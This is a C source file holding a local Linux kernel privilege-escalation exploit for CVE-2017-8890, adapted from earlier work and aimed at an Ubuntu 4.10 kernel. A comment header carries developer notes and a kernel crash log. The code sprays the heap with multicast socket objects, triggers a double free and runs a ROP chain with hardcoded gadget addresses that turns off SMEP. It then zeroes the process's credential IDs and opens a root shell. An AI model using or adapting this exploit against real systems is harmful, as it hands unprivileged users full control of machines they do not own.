/*
step3 on 20180716 @ thinkycx 
success to getroot with no smep  no kaslr no smap
deficiency：
    1. heap spray is not stable
    2. heap spray can only modify iml first 8 byte to 0x1000000a and kernel might oops because iml+0x18 is not null
    3. cannot debug it because nxtlist[RCU_NEXT_TAIL] will be modified and  the rcu thread cannot access 0x10000000a+0x20

-----------------------------------------------------------------------------------------------
when smep occurs, log is :

Continuing.
[   17.020828] sd 2:0:0:0: [sda] Assuming drive cache: write through
[   94.185152] unable to execute userspace code (SMEP?) (uid: 1000)
[   94.347638] BUG: unable to handle kernel paging request at 0000000000400b14
[   94.533038] IP: 0x400b14
[   94.609768] PGD 76cc7067 
[   94.609771] PUD 76c81067 
[   94.686503] PMD 78f79067 
[   94.765274] PTE 5c407025
[   94.842009] 
[   94.963598] Oops: 0011 [#1] SMP
[   95.052359] Modules linked in: vmw_vsock_vmci_transport vsock kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul vmw_balloon ghash_clmulni_intel cryptd input_leds joydev serio_raw vmw_vmci nfit parport_pc ppdev lp parport autofs4 vmw_pvscsi vmxnet3 hid_generic usbhid hid psmouse mptspi scsi_transport_spi ahci mptscsih libahci e1000 mptbase
[   95.798824] CPU: 0 PID: 1569 Comm: poc-context Tainted: G        W       4.10.0-19-generic #21~16.04.1-Ubuntu
[   96.046016] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/19/2017
[   96.311163] task: ffff8800772d9680 task.stack: ffffc90003218000
[   96.466624] RIP: 0010:0x400b14
[   96.557287] RSP: 0000:ffff88007b603f10 EFLAGS: 00010212
[   96.698808] RAX: 0000000000400b14 RBX: ffffffff81e707c0 RCX: 000000018040003e
[   96.879243] RDX: 000000010000002a RSI: ffffea0001e27ac0 RDI: 000000010000002a
[   97.064992] RBP: ffff88007b603f60 R08: 00000000789eb501 R09: 000000018040003e
[   97.247058] R10: ffff8800789eb540 R11: 0000000000002700 R12: ffff88007b61a0b8
[   97.432401] R13: 0000000000000001 R14: ffff880078f31ac8 R15: ffff88007b61a080
[   97.616762] FS:  00007ff2a6d9a700(0000) GS:ffff88007b600000(0000) knlGS:0000000000000000
[   97.827087] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   97.980581] CR2: 0000000000400b14 CR3: 0000000077753000 CR4: 00000000001406f0
[   98.168127] Call Trace:
[   98.236801]  <IRQ>
[   98.295600]  ? rcu_process_callbacks+0x1f3/0x5b0
[   98.422088]  __do_softirq+0xed/0x297
[   98.524773]  irq_exit+0xb6/0xc0
[   98.612496]  smp_apic_timer_interrupt+0x3d/0x50
[   98.738055]  apic_timer_interrupt+0x89/0x90
[   98.851042] RIP: 0033:0x400c47
[   98.939367] RSP: 002b:00007ff2a6d99db0 EFLAGS: 00000202 ORIG_RAX: ffffffffffffff10
[   99.136724] RAX: 0000000100000022 RBX: 0000000000000000 RCX: 000000007fffffda
[   99.321368] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000000000
[   99.498524] RBP: 00007ff2a6d99dd0 R08: 0000000000000000 R09: 0000000000000026
[   99.685912] R10: 0000000000000078 R11: 0000000000000000 R12: 0000000000000000
[   99.870271] R13: 00007fffb42fb0af R14: 00007ff2a6d9a9c0 R15: 0000000000000000
[  100.057656]  </IRQ>
[  100.123441] Code:  Bad RIP value.
[  100.219206] RIP: 0x400b14 RSP: ffff88007b603f10
[  100.344835] CR2: 0000000000400b14
[  100.432450] ---[ end trace 2009b6e7a5467e41 ]---
[  100.552999] Kernel panic - not syncing: Fatal exception in interrupt
[  100.716517] Kernel Offset: disabled
[  100.810187] Rebooting in 4 seconds..
[  104.970767] ACPI MEMORY or I/O RESET_REG.

---------------------------------------------------------------------------------------------------------------
zsh: you have suspended jobs.
➜  boot quit
zsh: command not found: quit
➜  boot gdb -s  ./vmlinux-4.10.0-19-generic  -ex "set architecture i386:x86-64:intel"  -ex "target remote /dev/ttyS0"    -ex "c"  | tee ~/kernel-debug-`dateregular`.gdb
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vmlinux-4.10.0-19-generic...


*/
// modify beraphin CVE-2017-8890.cpp
#include <stdio.h>
#include <stdlib.h>
#include <sys/select.h>  
#include <sys/socket.h>  
#include <arpa/inet.h>  
#include <netdb.h> 
#include <string.h> 
#include <unistd.h> 
#include <netinet/in.h> 
#include <fcntl.h> 
#include <time.h> 
#include <sys/types.h>
#include <pthread.h>
#include <net/if.h>
#include <errno.h>
#include <assert.h>
#include <sys/mman.h>
#include <stdbool.h> 

#define HELLO_WORLD_SERVER_PORT    6666 
#define LENGTH_OF_LISTEN_QUEUE 1
#define BUFFER_SIZE 1024
#define FILE_NAME_MAX_SIZE 512
bool server_init=false;
bool server_finish=false;
bool client_finish=false;

#define SPRAY_TIMES 48000 /* spray for the hole. */
static int ipv6_fd[SPRAY_TIMES]={0};
struct group_req gr_spray = {};
struct sockaddr_in6 in6_spray = {};
// #define FAKE_NEXT_RCU 0xc0000ff
#define FAKE_NEXT_RCU 0x000000010000000a
bool getroot_finish=false;
int pid = -1;
#define STACK_PIVOT_GADGET 0xffffffff8100008d


void init_spray()
{
    for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
        if ((ipv6_fd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("[init_spray] %d, socket() failed.", i);
            perror("Socket");
           exit(errno);
        }

    }
}

// static int prepare_spray_obj(int fd, // 堆喷射 实现函数
//     struct group_req* gr_spray_ptr, 
//     struct sockaddr_in6* in6_spray_ptr, unsigned c)
// {
//     gr_spray_ptr->gr_interface = 1;
//     in6_spray_ptr->sin6_family = AF_INET6;  // 初始化  sin6_family
//     int8_t addr[16] = "\xff\x00\x00\x0c\x00\x00\x00\x00\x00\x00"; // 初始化  sin6_addr 劫持到用户态地址。
//     *(unsigned long*)&addr[8] = c+0xabcd000000000000;
//     memcpy(&in6_spray_ptr->sin6_addr, addr, sizeof(addr));
//     memcpy(&gr_spray_ptr->gr_group, in6_spray_ptr, sizeof(*in6_spray_ptr));
//     // printf("--------prepare_spray_obj  now  time is %d---------\n",c );
    
//     setsockopt(fd, SOL_IPV6, 0x2a, gr_spray_ptr, sizeof(*gr_spray_ptr));       //setsockopt 这个函数会kmalloc ------------------
// }

// void start_spray(){
//     for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
//         prepare_spray_obj(ipv6_fd[i], &gr_spray, &in6_spray, i);
//         if(i%4000 ==0 ){
//             printf("spraytimes - %d |",i);
//         }
//     }

// }


static int prepare_spray_obj(int i)
{
    struct ip_mreq_source mreqsrc;
    memset(&mreqsrc,0,sizeof(mreqsrc));
    mreqsrc.imr_multiaddr.s_addr = htonl(inet_addr("10.10.2.224"));

    setsockopt(ipv6_fd[i], IPPROTO_IP, IP_ADD_SOURCE_MEMBERSHIP, &mreqsrc, sizeof(mreqsrc));

}

void start_spray(){
    for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
        prepare_spray_obj(i);
        if(i%4000 ==0 ){
            printf("spraytimes - %d |",i);
        }
    }

}

/*
ffffffff810aba10 T prepare_kernel_cred
ffffffff810ab620 T commit_creds

ffffffff810a6410 T find_get_pid
ffffffff810a6360 T pid_task
*/

unsigned long*  find_get_pid = (unsigned long*)0xffffffff810a6410;
unsigned long*  pid_task     = (unsigned long*)0xffffffff810a6360;


/*
restore rbp from rdx and  quit




*/
void get_root() {
        asm(
        "mov    %rcx, %rbp;"
        // "mov    %rcx, %rsp;"
        "sub    $0x18,%rsp;"
        "mov    pid,%edi;"
        "callq  *find_get_pid;"
        "mov    %rax,-0x8(%rbp);"
        "mov    -0x8(%rbp),%rax;"
        "mov    $0x0,%esi;"
        "mov    %rax,%rdi;"
        "callq  *pid_task;"
        "mov    %rax,-0x10(%rbp);"
        //"callq  *%rax;" // 用来看rax的值 看看获取的task_struct是不是一个内核态的地址，如果是 说明0x5f8可能有问题
        "mov    -0x10(%rbp),%rax;"
        "mov    0xa28(%rax),%rax;"          
        //"mov    0x5f8(%rax),%rax;"
        "mov    %rax,-0x18(%rbp);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x4,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x8,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0xc,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x10,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x14,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x18,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x1c,%rax;"
        "movl   $0x0,(%rax);"
        "mov    -0x18(%rbp),%rax;"
        "add    $0x20,%rax;"
        "movl   $0x0,(%rax);"
        "nop;"
        // "int    $3;"
        "leaveq;" 
        "retq   ;"
        );
}


/*
# gadgets
## step1 stack pivot
0xffffffff8100008d : xchg eax, esp ; ret

## save rbp to rdx or rcx  - empty
0xffffffff82437dcc : push rbp ; pop rcx ; ret 
0xffffffff823b1d70 : push rbp ; pop rdx ; ret

0xffffffff81078ce4 : pop rax ; ret



##  save rbp to rax
0xffffffff8157c9f0 <uart_startup+288>:	rex.WR xchg rbp,rax
0xffffffff8157c9f0 : xchg rax, rbp ; ret



## step2 modify cr4
// 0xffffffff822a2ecf : pop rdi ; ret 0               # gdb in is 0 ????
// 0xffffffff8101b5b0 : mov cr4, rdi ; pop rbp ; ret
// 0xffffffff812bfb4a : push rbp ; ret


// 0xffffffff811da170 : pop rsi ; ret
// rsi 
// 0xffffffff8119a1d7 : push rbp ; jmp rsi


#  bps 0xffffffff8100008e

# 0xffffffff810b402d : pop rdi ; ret
# 0xffffffff81078ce4 : pop rax ; ret
# 0xffffffff8100202b : pop rbp ; ret
# 0xffffffff8148ddcb : pop rcx ; ret
 

## step3 save rbp
0xffffffff82291e18 : push rbp ; ret 0

# stack
0x8182beee ->   0xffffffff811da170
           ->   0xffffffff8148ddcb
           ->   0xffffffff8119a1d7
           ->   0xffffffff810b402d
           ->   0x00000000000406f0  ; origin is 0x00000000001406f0
           ->   0xffffffff8101b5b0
           ->   0x81000a00  ; fake value saved to rbp
           ->   &get_root

# to store rbp value
push rbp; ret;
*/
static void off_cr4_gadget()
{
    void *addr_mmap = 0x81000000 - 0x1000;
    printf("[off_cr4_gadget] addr_mmap %p\n",addr_mmap);

    if ( mmap((void *)addr_mmap, 4096*2, PROT_READ|PROT_WRITE, 
         MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
         err(-1, "mmap at %p failed.", addr_mmap);
    unsigned long *fake_stack = (unsigned long *)0x8100008d;
    unsigned long ret_addr = (unsigned long)get_root;

    printf("[off_cr4_gadget] fake_stack %p\n",fake_stack);
    printf("[off_cr4_gadget] ret_addr %p\n",ret_addr);

    // fake_stack[0] = 0xffffffff810b402d;
    // fake_stack[1] = 0x00000000000406f0;
    // fake_stack[2] = 0xffffffff8101b5b0;
    // fake_stack[3] = 0x81000a00;
    // fake_stack[4] = ret_addr; 


// 0xffffffff8148ddcb : pop rcx ; ret
// 0xffffffff812bfb4a : push rbp ; ret

// 0xffffffff8102cae1 : mov rax, rcx ; ret
// 0xffffffff810680eb : push rbp ; pop rax ; cli ; jle 0xffffffff81068152 ; ret

    fake_stack[0] = 0xffffffff811da170;
    fake_stack[1] = 0xffffffff8148ddcb;
    fake_stack[2] = 0xffffffff8119a1d7;
    fake_stack[3] = 0xffffffff810b402d;
    fake_stack[4] = 0x00000000000406f0;
    fake_stack[5] = 0xffffffff8101b5b0;
    fake_stack[6] = 0x81000a00;
    fake_stack[7] = ret_addr;
    
    
  //  */
}

void *modify_func(){ 
    printf("modify_func success...get_root @ %p\n",get_root);

    unsigned long fix_ebp_addr = FAKE_NEXT_RCU + 8*3;  // let ip_mc_leave_src not to use this value
    unsigned long fix_func_addr = FAKE_NEXT_RCU + 8*5;
    // unsigned long func = (unsigned long)0xdeadbeef;
    unsigned long ebp = (unsigned long)0x0;
    // unsigned long func = (unsigned long)get_root;
    unsigned long func = (unsigned long)0xffffffff8100008d;
    
    printf("modify_func success...func @ %p\n",(unsigned long *)func);
    while(1) {
        *(unsigned long *)(fix_ebp_addr) = ebp;    
        *(unsigned long *)(fix_func_addr) = func;    
    }
}
//#include <sys/mman.h>
static void init_fake_obj()
{
    void *addr_mmap = FAKE_NEXT_RCU-0xa;
    if ( mmap((void *)addr_mmap, 4096, PROT_READ|PROT_WRITE, 
         MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
         err(-1, "mmap at %p failed.", addr_mmap);
    unsigned long *addr_next_rcu = (unsigned long *)FAKE_NEXT_RCU;
    unsigned long func = (unsigned long)0xdeadbeafdeadbeaf;

    addr_next_rcu[0] = 0x0;
    addr_next_rcu[1] = 0x0a0a02e0;
    addr_next_rcu[2] = 0x00000002;
    addr_next_rcu[3] = 0x0;
    addr_next_rcu[4] = 0x0;
    addr_next_rcu[5] = func;

    pthread_t id_func_modify;
	pthread_create(&id_func_modify,NULL,modify_func,NULL);    
}

void *server(void *arg)
{
    struct sockaddr_in server_addr;
    bzero(&server_addr,sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htons(INADDR_ANY);
    server_addr.sin_port = htons(HELLO_WORLD_SERVER_PORT);

    struct	group_req group = {0};
    struct sockaddr_in *psin;

	psin = (struct sockaddr_in *)&group.gr_group;
    psin->sin_family = AF_INET;
    psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));

    int server_socket = socket(AF_INET,SOCK_STREAM,0);
    if( server_socket < 0)
    {
        printf("[Server]Create Socket Failed!\n");
        exit(1);
    }
    // { 
	   // int opt =1;
    //    //IPPROTO_IP
       setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
    // }

    if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr)))
    {
        printf("[Server]Server Bind Port : %d Failed!\n", HELLO_WORLD_SERVER_PORT); 
        exit(1);
    }

        
    if ( listen(server_socket, LENGTH_OF_LISTEN_QUEUE) )
   {
       printf("[Server]Server Listen Failed!\n"); 
       exit(1);
    }

    struct sockaddr_in client_addr;
    socklen_t length = sizeof(client_addr);
 
 	server_init=true;
    printf ("[Server]accept..... \n"); 
    int new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
    if ( new_server_socket < 0)
    {
        close(server_socket);
        printf("[Server]Server Accept Failed!\n");
        return NULL;
    }
        
    printf("[Server]sleep 1s and close new_server_socket...[Attention] first free!...\n");
    sleep(1);
    // [1] SPRAY PREPARE
    init_spray();
    // 
    close(new_server_socket);
    //there must be a period between 2 close()???? 

    printf("[Server] sleep 5s to wait kfree_rcu...\n");
    sleep(5);

    // start_spray();
    
    printf("[Server] start spray...\n");
    // START SPRAY
    start_spray();

    // trigger
    printf("[Server]sleep 1s and close server_socket..[Attention] second free!...\n");
    printf("[Server] now pid %d\n", pid);
    sleep(1);
    close(server_socket);

    printf("[Server]sleep 10s and getroot...\n");
    sleep(10);

	server_finish=true;

    printf("[server]get_root triggered done!!!!\n");
    printf("[server] current uid is : %d \n", getuid());
    printf("[server] current euid is : %d \n", geteuid());

    system("/bin/sh");

    return NULL;
}
void *client(void *arg){
	struct sockaddr_in client_addr;
	bzero(&client_addr,sizeof(client_addr));
	client_addr.sin_family=AF_INET;
	client_addr.sin_addr.s_addr=htons(INADDR_ANY);
	client_addr.sin_port=htons(0);
	int client_socket=socket(AF_INET,SOCK_STREAM,0);
	if(client_socket<0){
		printf("[Client]Create socket failed!\n");
		exit(1);
	}
	if(bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr))){
		printf("[Client] client bind port failed!\n");
		exit(1);
	}
	struct sockaddr_in server_addr;
	bzero(&server_addr,sizeof(server_addr));
	server_addr.sin_family=AF_INET;
	if(inet_aton("127.0.0.1",&server_addr.sin_addr)==0){
        /*
        int inet_aton(const char *cp, struct in_addr *inp);
        inet_aton() converts the Internet host address cp from the IPv4 numbers-and-dots notation into \
            binary form (in network byte order) and stores it in the structure that inp points to. 
        */
		printf("[Client]Server IP Address error\n");
		exit(0);
	}
	server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);
	socklen_t server_addr_length=sizeof(server_addr);
	if(connect(client_socket,(struct sockaddr*)&server_addr,server_addr_length)<0){
		printf("[Client]cannot connect to 127.0.0.1!\n");
		exit(1);
	}
	printf("[Client]Close client socket...\n");
	close(client_socket);

    client_finish=true;
	return NULL;
}

int main(int argc,char* argv[])
{	
    pid = getpid();
    printf("[main] now pid %d\n", pid);
    printf("[main] current uid is : %d \n", getuid());
    printf("[main] current euid is : %d \n", geteuid());

    init_fake_obj();
    off_cr4_gadget();
	
    pthread_t id_server, id_client;
	pthread_create(&id_server,NULL,server,NULL);
	while(!server_init){
		sleep(1);
	}
    printf("server init success...\n");

	pthread_create(&id_client,NULL,client,NULL);
	while(!client_finish){
        printf("[main] client finish\n");
        break;
	}	
    while(!server_finish){
        printf("[main] server finish...sleep 3s \n");
        sleep(3);
	}
    wait();

	return 0;
}